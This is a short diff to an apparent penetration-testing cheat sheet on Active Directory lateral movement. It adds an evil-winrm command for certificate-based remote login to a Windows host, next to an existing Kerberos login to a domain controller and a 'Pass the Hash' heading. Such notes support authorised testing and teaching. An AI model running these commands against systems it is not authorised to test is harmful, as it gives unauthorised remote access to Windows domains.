@@ -516,6 +516,10 @@ Finally:
 ```
 evil-winrm -r DOMAIN.LOCAL -i dc01.domain.local
 ```
+- Login with certificate
+```
+evil-winrm -S -i <IP> -c <pubkey key.cert> -k <privkey key.pem>
+```
 
 ## Pass the Hash
 - this will not work for Kerberos authentication but only for servers or services using NTLM authentication.
